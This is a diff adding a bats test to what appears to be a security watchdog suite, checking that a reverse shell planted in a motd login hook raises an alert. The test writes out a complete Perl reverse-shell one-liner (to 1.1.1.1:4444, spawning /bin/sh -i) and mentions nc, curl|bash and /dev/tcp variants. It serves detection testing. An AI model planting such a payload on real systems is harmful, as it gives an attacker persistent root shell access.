@@ -283,3 +283,16 @@ seed_benign() {
     run_wd
     cap | grep -q 'distinctive-attacker-motd'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on motd script surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp motd-script
+    # rev-shell variants. Perl on every Debian/Ubuntu. Locks
+    # perl axis on T1546.004 motd per-login-trigger root-exec
+    # persistence.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/00-header"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
